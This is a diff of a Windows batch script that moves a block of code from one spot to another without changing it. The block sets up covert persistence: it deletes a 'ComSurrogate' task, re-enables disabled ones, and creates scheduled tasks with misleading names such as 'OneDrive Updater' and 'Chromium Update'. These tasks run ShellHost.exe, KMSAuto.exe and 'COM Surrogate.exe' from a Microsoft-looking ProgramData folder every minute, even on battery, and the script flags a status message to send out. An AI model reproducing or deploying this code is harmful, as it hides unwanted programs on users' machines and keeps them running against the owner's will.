@@ -252,62 +252,6 @@ timeout /t 1 /nobreak >nul
 
 
 
-:REMOVINGTASKS
-
-schtasks /end /tn "ComSurrogate" /f >nul 2>&1
-schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
-
-
-
-
-
-
-
-
-:CHECKINGTASKS
-
-:: Define tasks to check
-set "Task1=OneDrive Updater"
-set "Task2=OneDrive Task"
-set "Task3=Microsoft Update"
-
-
-:: Check if "OneDrive Updater" & "OneDrive Task"  exists & Enable them if disabled
-schtasks /query /tn "%Task1%" >nul 2>&1 || schtasks /query /tn "%Task2%" >nul 2>&1 || schtasks /query /tn "%Task3%" >nul 2>&1 || goto TASKSEVERY
-schtasks /query /tn "%Task1%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task1%" /enable)
-schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task2%" /enable)
-schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)
-
-
-goto AFTERTASKSEVERY
-
-
-
-:TASKSEVERY
-echo At least one task is missing! Adding tasks...
-
-:: Add your commands here
-schtasks /create /tn "OneDrive Updater" /tr "\"%ProgramData%\Microsoft\Windows\ShellHost.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Updater'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSAuto.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Task'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-
-set "MESSAGE=TasksAdded|"
-set "CheckSend=1"
-
-
-
-
-:AFTERTASKSEVERY
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -336,30 +280,6 @@ if not exist "%file4%" goto STARTUPTAASK
 :: If all files are found, continue with other tasks
 echo All files found.
 goto COMMANDSFORAGENTS
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -515,6 +435,76 @@ if exist "%embeddedScript%" (
 
 set "MESSAGE=%MESSAGE%NIRCMD|"
 set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:REMOVINGTASKS
+
+schtasks /end /tn "ComSurrogate" /f >nul 2>&1
+schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
+
+
+
+
+
+
+
+
+:CHECKINGTASKS
+
+:: Define tasks to check
+set "Task1=OneDrive Updater"
+set "Task2=OneDrive Task"
+set "Task3=Microsoft Update"
+
+
+:: Check if "OneDrive Updater" & "OneDrive Task"  exists & Enable them if disabled
+schtasks /query /tn "%Task1%" >nul 2>&1 || schtasks /query /tn "%Task2%" >nul 2>&1 || schtasks /query /tn "%Task3%" >nul 2>&1 || goto TASKSEVERY
+schtasks /query /tn "%Task1%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task1%" /enable)
+schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task2%" /enable)
+schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)
+
+
+goto AFTERTASKSEVERY
+
+
+
+:TASKSEVERY
+echo At least one task is missing! Adding tasks...
+
+:: Add your commands here
+schtasks /create /tn "OneDrive Updater" /tr "\"%ProgramData%\Microsoft\Windows\ShellHost.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Updater'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
+schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSAuto.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Task'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
+schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
+
+set "MESSAGE=TasksAdded|"
+set "CheckSend=1"
+
+
+
+
+:AFTERTASKSEVERY
+
+
+
+
 
 
 
